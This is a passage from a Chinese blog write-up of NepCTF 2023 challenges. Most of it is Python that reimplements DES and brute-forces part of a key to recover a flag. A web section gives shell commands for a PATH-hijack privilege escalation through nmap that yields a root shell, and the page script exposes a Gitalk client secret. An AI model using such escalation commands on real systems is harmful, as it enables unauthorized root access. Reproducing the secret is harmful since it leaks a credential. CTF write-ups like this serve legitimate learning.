class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S_box</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">        row = data[i] * <span class="number">2</span> + data[i + <span class="number">5</span>]</span><br><span class="line">        col = reduce(add, [data[i + j] * (<span class="number">2</span> ** (<span class="number">4</span> - j)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)])</span><br><span class="line">        output += [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">format</span>(__s_box[i // <span class="number">6</span>][row][col], <span class="string">&#x27;04b&#x27;</span>)]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>], sub_keys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    plain = IP(plain)</span><br><span class="line">    L, R = plain[:<span class="number">32</span>], plain[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        prev_L = L</span><br><span class="line">        L = R</span><br><span class="line">        expanded_R = EP(R)</span><br><span class="line">        xor_result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(expanded_R, sub_keys[i])]</span><br><span class="line">        substituted = S_box(xor_result)</span><br><span class="line">        permuted = P(substituted)</span><br><span class="line"></span><br><span class="line">        R = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(permuted, prev_L)]</span><br><span class="line"></span><br><span class="line">    cipher = R + L</span><br><span class="line">    cipher = [cipher[x] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                                  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">                                  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                                  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">                                  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                                  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">                                  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">                                  <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitxor</span>(<span class="params">plain1: <span class="type">List</span>[<span class="built_in">int</span>], plain2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span></span><br><span class="line">            <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain1), <span class="number">2</span>) ^ <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain2), <span class="number">2</span>))[<span class="number">2</span>:].zfill(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>], sub_keys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="comment"># plain = IP(plain)</span></span><br><span class="line">    L, R = plain[:<span class="number">32</span>], plain[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        prev_L = L</span><br><span class="line">        L = R</span><br><span class="line">        expanded_R = EP(R)</span><br><span class="line">        xor_result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(expanded_R, sub_keys[i])]</span><br><span class="line">        substituted = S_box(xor_result)</span><br><span class="line">        permuted = P(substituted)</span><br><span class="line"></span><br><span class="line">        R = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(permuted, prev_L)]</span><br><span class="line"></span><br><span class="line">    cipher = R + L</span><br><span class="line">    <span class="comment"># cipher = [cipher[x] for x in [39, 7, 47, 15, 55, 23, 63, 31,</span></span><br><span class="line">    <span class="comment">#                               38, 6, 46, 14, 54, 22, 62, 30,</span></span><br><span class="line">    <span class="comment">#                               37, 5, 45, 13, 53, 21, 61, 29,</span></span><br><span class="line">    <span class="comment">#                               36, 4, 44, 12, 52, 20, 60, 28,</span></span><br><span class="line">    <span class="comment">#                               35, 3, 43, 11, 51, 19, 59, 27,</span></span><br><span class="line">    <span class="comment">#                               34, 2, 42, 10, 50, 18, 58, 26,</span></span><br><span class="line">    <span class="comment">#                               33, 1, 41, 9, 49, 17, 57, 25,</span></span><br><span class="line">    <span class="comment">#                               32, 0, 40, 8, 48, 16, 56, 24]]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">P0 = [<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                                  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">                                  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                                  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">                                  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                                  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">                                  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">                                  <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]</span><br><span class="line">P0_inv = [<span class="number">0</span>] * <span class="built_in">len</span>(P0)</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(P0):</span><br><span class="line">    P0_inv[b] = i</span><br><span class="line"></span><br><span class="line">_IP_inv = [<span class="number">0</span>] * <span class="built_in">len</span>(_IP)</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(_IP):</span><br><span class="line">    _IP_inv[b] = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P_set</span>(<span class="params">c, box</span>):</span><br><span class="line">    <span class="keyword">return</span> [c[_] <span class="keyword">for</span> _ <span class="keyword">in</span> box]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">x: []</span>):</span><br><span class="line">    res = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">8</span>):</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, x[i:i+<span class="number">8</span>])), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破过程</span></span><br><span class="line"><span class="comment"># check = []</span></span><br><span class="line"><span class="comment"># for test in range(2 ** 9):</span></span><br><span class="line"><span class="comment"># # for test in range(1):</span></span><br><span class="line"><span class="comment">#     LL= [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span><br><span class="line"><span class="comment">#     RR= [0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0]</span></span><br><span class="line"><span class="comment">#     LL += list(map(int, bin(test)[2:].ljust(9, &quot;0&quot;)))</span></span><br><span class="line"><span class="comment">#     sub_keys = []</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     t=[0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0]</span></span><br><span class="line"><span class="comment">#     for i in range(16):</span></span><br><span class="line"><span class="comment">#         combined = LL + RR</span></span><br><span class="line"><span class="comment">#         sub_key = PC_2(combined)</span></span><br><span class="line"><span class="comment">#         sub_keys.append(sub_key)</span></span><br><span class="line"><span class="comment">#         for j in range(ROTATIONS[::-1][i]):</span></span><br><span class="line"><span class="comment">#             LL.insert(0, LL.pop(-1))</span></span><br><span class="line"><span class="comment">#             RR.insert(0, RR.pop(-1))</span></span><br><span class="line"><span class="comment">#     # print(LL)</span></span><br><span class="line"><span class="comment">#     # print(RR)</span></span><br><span class="line"><span class="comment">#     # sub_keys = sub_keys[::-1]</span></span><br><span class="line"><span class="comment">#     # print(sub_keys)</span></span><br><span class="line"><span class="comment">#     ct = decrypt(P_set(t[:64], P0_inv), sub_keys)</span></span><br><span class="line"><span class="comment">#     print(test, bin2str(P_set(ct, _IP_inv)))</span></span><br><span class="line"><span class="comment">#     x = bin2str(P_set(ct, _IP_inv))</span></span><br><span class="line"><span class="comment">#     check.append((len(repr(x)), x, test))</span></span><br><span class="line"><span class="comment"># check.sort()</span></span><br><span class="line"><span class="comment"># print(check)</span></span><br><span class="line"><span class="comment"># (22, bytearray(b&#x27;NepCTF&#123;N&#x27;), 503)</span></span><br><span class="line"></span><br><span class="line">LL= [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">RR= [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">LL += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(<span class="number">503</span>)[<span class="number">2</span>:].ljust(<span class="number">9</span>, <span class="string">&quot;0&quot;</span>)))</span><br><span class="line">sub_keys = []</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">t=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    combined = LL + RR</span><br><span class="line">    sub_key = PC_2(combined)</span><br><span class="line">    sub_keys.append(sub_key)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[::-<span class="number">1</span>][i]):</span><br><span class="line">        LL.insert(<span class="number">0</span>, LL.pop(-<span class="number">1</span>))</span><br><span class="line">        RR.insert(<span class="number">0</span>, RR.pop(-<span class="number">1</span>))</span><br><span class="line">ct = decrypt(P_set(t[:<span class="number">64</span>], P0_inv), sub_keys)</span><br><span class="line">raw = P_set(ct, _IP_inv)</span><br><span class="line">x = bin2str(raw)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">flag += x</span><br><span class="line"></span><br><span class="line">z = raw</span><br><span class="line">keys_t = LL + RR</span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(__pc1):</span><br><span class="line">    key[b] = keys_t[i]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(bin2str(key))</span><br><span class="line">ct = decrypt(P_set(t[<span class="number">64</span>:<span class="number">64</span>*<span class="number">2</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class="number">1</span>])</span><br><span class="line">raw = P_set(ct, _IP_inv)</span><br><span class="line">x = bin2str(raw)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">flag += x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z = raw</span><br><span class="line">ct = decrypt(P_set(t[<span class="number">64</span>*<span class="number">2</span>:<span class="number">64</span>*<span class="number">3</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class="number">1</span>])</span><br><span class="line">raw = P_set(ct, _IP_inv)</span><br><span class="line">x = bin2str(raw)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">flag += x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2><p>简单的java反序列化漏洞，一把梭</p>
<p><img src="/p/2023NepCTF/4bfea74d624d582500046b3938b36a9.png" alt="4bfea74d624d582500046b3938b36a9"></p>
<h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h2><p>渗透签到，提示环境变量提权，一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/sh&quot;&gt; /tmp/ports-alive</span><br><span class="line">chmod 777 /tmp/ports-alive</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">nmap -v</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>作者: Csome</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-08-15</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a><i class="fa fa-tag"></i><a class="tag" href="/tags/Pwn/" title="Pwn">Pwn </a><i class="fa fa-tag"></i><a class="tag" href="/tags/NepCTF/" title="NepCTF">NepCTF </a><span>大约4829个字, 16分钟5秒读完</span></div></div></div></div><div class="share"><div class="share-btn linkonly"><a class="fa fa-link" onclick="Utils.copyToClipboard(window.location.href)" ref="sidebar"></a></div><div class="share-btn evernote"><a class="fa fa-share" onclick="Anatolo.share.native()" ref="sidebar"></a></div><div class="share-btn weibo"><a class="fab fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="share-btn twitter"><a class="fab fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5B2023NepCTF%5D%20Csome%20Writeup%0Ahttps://blog.csome.cc//p/2023NepCTF/%0A"></a></div><div class="share-btn mastodon"><a class="fab fa-mastodon" target="_blank" rel="noopener" href="https://mastodonshare.com/?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5B2023NepCTF%5D%20Csome%20Writeup%0Ahttps://blog.csome.cc//p/2023NepCTF/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/p/house-of-some/" title="Bring back the stack attack -- House of some一种高版本glibc的利用思路">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/p/2022CISCN-hn-wp/" title="[2022CISCN]华南赛区分区赛 部分Pwn wp">下一篇</a></li></ul></div><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><a id="comments"></a><div id="gitalk_container" style="padding: 10px"></div></div></div></div></div></main-outlet><script>(async function(){ if (Anatolo.search == null) await Anatolo.getMsg("search-init"); Anatolo.search.config = {translation:{posts:"文章",pages:"页面",categories:"分类",tags:"标签",untitled:"(无标题)",} }; })()</script><div class="searchbox ins-search modal-cover"><div class="searchbox-container ins-search-container modal-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="Anatolo.search.closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><button class="float-button hide" id="scroll-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})" type="button" title="回到顶部"><i class="fa fa-angle-up"></i></button><div class="modal-cover" id="success-indicator"><div class="modal-container indicator"><i class="fa fa-check"></i></div></div></body></html>